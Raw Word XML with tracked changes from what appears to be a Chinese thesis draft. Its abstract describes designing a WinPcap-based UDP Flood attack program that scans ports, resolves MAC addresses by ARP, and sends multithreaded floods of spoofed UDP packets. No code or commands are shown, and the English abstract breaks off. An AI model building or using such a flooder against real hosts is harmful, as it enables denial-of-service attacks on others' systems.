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FDAAB" w14:textId="27A42A3B" w:rsidR="00150B71" w:rsidRPr="00105D33" w:rsidRDefault="00105D33" w:rsidP="00105D33">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="6180"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:sectPr w:rsidR="00150B71" w:rsidRPr="00105D33">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fmt="upperRoman" w:start="1"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="312"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w: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0" w:name="_Toc482141217"/>
      <w:bookmarkStart w:id="1" w:name="_Toc482141890"/>
      <w:bookmarkStart w:id="2" w:name="_Toc482522600"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>摘要</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
      <w:bookmarkEnd w:id="1"/>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="16129BE7" w14:textId="2E9BE6BE" w:rsidR="00DE2F74" w:rsidRPr="0048734B" w:rsidRDefault="00DE2F74" w:rsidP="00DE2F74">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="3" w:author="yong li" w:date="2017-05-14T10:48:00Z"/>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="4" w:author="yong li" w:date="2017-05-14T10:48:00Z">
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>UDP</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>协议的攻击通常可分为</w:t>
        </w:r>
        <w:r w:rsidR="002D5B2B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve"> UDP Flood</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>攻击、</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">UDP Fraggle </w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>攻击和</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve"> DNS Query Flood </w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>攻击</w:t>
        </w:r>
        <w:r w:rsidRPr="00F44FA1">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>其攻击目的主要有</w:t>
        </w:r>
        <w:r w:rsidRPr="00F44FA1">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>对网络带宽的流量攻击</w:t>
        </w:r>
        <w:r w:rsidRPr="00F44FA1">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>对服务器某特定服务的攻击</w:t>
        </w:r>
        <w:r w:rsidRPr="00F44FA1">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>.UDP Flood</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>攻击是通过发送</w:t>
        </w:r>
        <w:r w:rsidRPr="00F44FA1">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>UDP</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>数据包来发动攻击的方式</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">. </w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>在</w:t>
        </w:r>
        <w:r w:rsidRPr="00F44FA1">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>UDP Flood</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>攻击中，攻击者发送大量虚假源</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>IP</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>的</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>UDP</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>数据包，从而使被攻击者不能提供正常的服务，甚至造成系统资源耗尽、系统死机</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">. </w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>同时</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>UDP Flood</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>攻击易于实施，只要被攻击者开放一个</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve"> UDP </w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>服务端口，即可针对该服务发动攻击</w:t>
        </w:r>
        <w:r w:rsidRPr="0048734B">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="62F39F1E" w14:textId="77777777" w:rsidR="00DE2F74" w:rsidRPr="00902006" w:rsidRDefault="00DE2F74" w:rsidP="00DE2F74">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="5" w:author="yong li" w:date="2017-05-14T10:48:00Z"/>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="6" w:author="yong li" w:date="2017-05-14T10:48:00Z">
        <w:r w:rsidRPr="00902006">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>本文在深入分析UDP协议的工作原理的基础上，设计并实现了</w:t>
        </w:r>
        <w:r w:rsidRPr="004F46B3">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>UDP Flood攻击程序</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。该程序能够</w:t>
        </w:r>
        <w:r w:rsidRPr="004F46B3">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>构造相应的UDP报文，向指定主机的指定端口发送，捕获并解析响应报文，根据报文内容判定</w:t>
        </w:r>
        <w:bookmarkStart w:id="7" w:name="_GoBack"/>
        <w:bookmarkEnd w:id="7"/>
        <w:r w:rsidRPr="004F46B3">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>该主机指定的UDP端口是否开放的；</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>能够</w:t>
        </w:r>
        <w:r w:rsidRPr="004F46B3">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"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ins>
    </w:p>
    <w:p w14:paraId="7D0D1DCF" w14:textId="0DCB237C" w:rsidR="001259C2" w:rsidRPr="004F46B3" w:rsidDel="00DE2F74" w:rsidRDefault="001259C2" w:rsidP="004F46B3">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:del w:id="8" w:author="yong li" w:date="2017-05-14T10:48:00Z"/>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="9" w:author="yong li" w:date="2017-05-14T10:48:00Z">
        <w:r w:rsidRPr="00902006" w:rsidDel="00DE2F74">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:delTex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通过实现UDP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00902006" w:rsidDel="00DE2F74">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:delText xml:space="preserve"> F</w:delText>
        </w:r>
        <w:r w:rsidRPr="00902006" w:rsidDel="00DE2F74">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
          </w:rPr>
          <w:delText>lood攻击程序，可以了解常见的网络扫描和攻击技术。</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="10" w:author="renxt" w:date="2017-05-13T20:35:00Z">
        <w:del w:id="11" w:author="yong li" w:date="2017-05-14T10:48:00Z">
          <w:r w:rsidR="004F46B3" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
              <w:color w:val="000000"/>
            </w:rPr>
            <w:delText xml:space="preserve">（DDos不能引出UDP </w:delText>
          </w:r>
          <w:r w:rsidR="004F46B3" w:rsidRPr="00902006" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:color w:val="000000"/>
            </w:rPr>
            <w:delText>F</w:delText>
          </w:r>
          <w:r w:rsidR="004F46B3" w:rsidRPr="00902006" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
              <w:color w:val="000000"/>
            </w:rPr>
            <w:delText>lood攻击</w:delText>
          </w:r>
          <w:r w:rsidR="004F46B3" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
              <w:color w:val="000000"/>
            </w:rPr>
            <w:delText>吧。</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="12" w:author="renxt" w:date="2017-05-13T21:17:00Z">
        <w:del w:id="13" w:author="yong li" w:date="2017-05-14T10:48:00Z">
          <w:r w:rsidR="009B165B" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
              <w:color w:val="000000"/>
            </w:rPr>
            <w:delText>应从攻击开始写，别从DDos开始</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="14" w:author="renxt" w:date="2017-05-13T20:35:00Z">
        <w:del w:id="15" w:author="yong li" w:date="2017-05-14T10:48:00Z">
          <w:r w:rsidR="004F46B3" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
              <w:color w:val="000000"/>
            </w:rPr>
            <w:delText>）</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7F8DA502" w14:textId="444B413D" w:rsidR="004F46B3" w:rsidRPr="00902006" w:rsidDel="00DE2F74" w:rsidRDefault="001259C2" w:rsidP="004F46B3">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:del w:id="16" w:author="yong li" w:date="2017-05-14T10:48:00Z"/>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="17" w:author="yong li" w:date="2017-05-14T10:48:00Z">
        <w:r w:rsidRPr="00902006" w:rsidDel="00DE2F74">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>本文在深入分析ARP、ICMP、UDP等网络协议的工作原理的基础上，设计并实现了基于WinPcap的数据捕获和发送的UDP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00902006" w:rsidDel="00DE2F74">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          </w:rPr>
          <w:delText xml:space="preserve"> F</w:delText>
        </w:r>
        <w:r w:rsidRPr="00902006" w:rsidDel="00DE2F74">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>lood攻击程序。可以选择网卡，进行主机扫描，可以获得指定主机的MAC地址，实现UDP端口扫描，最终实现UDP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00902006" w:rsidDel="00DE2F74">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          </w:rPr>
          <w:delText xml:space="preserve"> F</w:delText>
        </w:r>
        <w:r w:rsidRPr="00902006" w:rsidDel="00DE2F74">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>lood攻击。</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="18" w:author="renxt" w:date="2017-05-13T20:35:00Z">
        <w:del w:id="19" w:author="yong li" w:date="2017-05-14T10:48:00Z">
          <w:r w:rsidR="004F46B3" w:rsidRPr="004F46B3" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>UDP Flood攻击程序</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="20" w:author="renxt" w:date="2017-05-13T20:37:00Z">
        <w:del w:id="21" w:author="yong li" w:date="2017-05-14T10:48:00Z">
          <w:r w:rsidR="004F46B3" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>。该程序能够</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="22" w:author="renxt" w:date="2017-05-13T20:35:00Z">
        <w:del w:id="23" w:author="yong li" w:date="2017-05-14T10:48:00Z">
          <w:r w:rsidR="004F46B3" w:rsidRPr="004F46B3" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>构造相应的UDP报文，向指定主机的指定端口发送，捕获并解析响应报文，根据报文内容判定该主机指定的UDP端口是否开放的；</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="24" w:author="renxt" w:date="2017-05-13T20:38:00Z">
        <w:del w:id="25" w:author="yong li" w:date="2017-05-14T10:48:00Z">
          <w:r w:rsidR="004F46B3" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>能够</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="26" w:author="renxt" w:date="2017-05-13T20:35:00Z">
        <w:del w:id="27" w:author="yong li" w:date="2017-05-14T10:48:00Z">
          <w:r w:rsidR="004F46B3" w:rsidRPr="004F46B3" w:rsidDel="00DE2F74">
            <w:rPr>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>通过ARP协议获取指定主机的MAC地址，作为UDP报文的目的MAC；随机生成UDP报文的源MAC、源IP和源端口，构造UDP报文的以太网首部、IP首部和UDP报文；利用多线程技术，向指定主机发送大量伪造的UDP报文，对目标主机进行攻击。</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2D98478D" w14:textId="2CF0F286" w:rsidR="00150B71" w:rsidRPr="00C6765D" w:rsidRDefault="00150B71" w:rsidP="00150B71">
      <w:pPr>
        <w:pStyle w:val="aa"/>
        <w:snapToGrid w:val="0"/>
        <w:spacing w:before="120" w:after="120" w:line="312" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:hAnsi="宋体"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>关键词</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:ins w:id="28" w:author="renxt" w:date="2017-05-13T20:38:00Z">
        <w:r w:rsidR="00213FB6" w:rsidRPr="00213FB6">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:rPrChange w:id="29" w:author="renxt" w:date="2017-05-13T20:38:00Z">
              <w:rPr>
                <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>网络</w:t>
        </w:r>
        <w:r w:rsidR="00213FB6">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>攻击；</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="007064DB" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:hAnsi="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>UDP F</w:t>
      </w:r>
      <w:r w:rsidR="007064DB" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lood</w:t>
      </w:r>
      <w:r w:rsidR="001259C2">
        <w:rPr>
          <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击；</w:t>
      </w:r>
      <w:del w:id="30" w:author="renxt" w:date="2017-05-13T20:38:00Z">
        <w:r w:rsidR="001259C2" w:rsidDel="00213FB6">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:delText>WinPcap；</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="001259C2">
        <w:rPr>
          <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>网络扫描</w:t>
      </w:r>
      <w:ins w:id="31" w:author="renxt" w:date="2017-05-13T20:39:00Z">
        <w:r w:rsidR="00213FB6">
          <w:rPr>
            <w:rFonts w:hAnsi="宋体" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>；WinPcap</w:t>
        </w:r>
      </w:ins>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32" w:name="_Toc482141218"/>
      <w:bookmarkStart w:id="33" w:name="_Toc482141891"/>
      <w:bookmarkStart w:id="34" w:name="_Toc482522601"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Abstract</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
      <w:bookmarkEnd w:id="33"/>
      <w:bookmarkEnd w:id="34"/>
    </w:p>
    <w:p w14:paraId="7CEAC846" w14:textId="4B58ACDB" w:rsidR="00EC1F28" w:rsidRDefault="00134988" w:rsidP="00EC1F28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="35" w:author="yong li" w:date="2017-05-14T10:52:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="36" w:author="yong li" w:date="2017-05-14T10:53:00Z">
        <w:r w:rsidDel="00757FF8">
          <w:delText>In</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="37" w:author="yong li" w:date="2017-05-14T10:52:00Z">
        <w:r w:rsidR="00EC1F28">
          <w:t>UDP attacks can be classified into UDP flood attacks, UDP Fraggle attacks, and DNS Query Flood attacks. The main purpose of the attack is: traffic attack on network bandwidth; attack on a specific service of the server.UDP flood attack is sent by sending UDP data In the UDP flood attack, the attacker sends a large number of false source IP UDP packets, so that the attacker can not provide the normal service, and even cause the system resources to run out, the system crashes.At the same time UDP flood attack Easy to implement, as long as the attacker to open a UDP service port, you can attack the service.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="56121FA3" w14:textId="77777777" w:rsidR="00EC1F28" w:rsidRDefault="00EC1F28" w:rsidP="00EC1F28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="38" w:author="yong li" w:date="2017-05-14T10:52:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="39" w:author="yong li" w:date="2017-05-14T10:52:00Z">
        <w:r>
